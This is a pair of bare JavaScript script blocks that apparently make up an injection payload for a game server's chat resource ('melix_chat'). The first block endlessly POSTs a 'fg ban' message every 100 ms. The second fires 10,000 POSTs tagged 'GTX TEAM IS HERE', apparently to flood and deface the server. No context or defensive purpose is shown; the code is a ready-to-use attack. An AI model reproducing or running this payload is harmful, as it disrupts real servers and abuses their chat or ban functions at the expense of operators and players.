<script>
const msg = "fg ban";

const body = JSON.stringify({
  message: msg
});

setInterval(() => {
  fetch("https://melix_chat/chatResult", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: body
  });
}, 100);
</script>

<script>
for (let i = 1; i <= 10000; i++) {
  setTimeout(() => {
    fetch("https://melix_chat/chatResult", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        id: i,
        Reason: "GTX TEAM IS HERE"
      })
    });
  }, i * 50);
}
</script>
